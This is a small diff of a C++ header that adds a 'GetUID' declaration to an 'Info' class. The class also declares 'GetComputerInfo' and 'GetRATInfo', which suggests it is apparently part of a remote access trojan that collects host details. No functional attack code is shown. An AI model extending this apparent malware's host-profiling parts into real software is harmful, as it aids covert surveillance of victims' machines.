@@ -15,6 +15,7 @@ public:
 	~Info();
 private:
 	bool GetComputerInfo(BYTE*, size_t*);
+	DWORD GetUID();
 	bool GetRATInfo(BYTE* dataBuffer, size_t* dataMaxSize);
 	config* conf;
 };
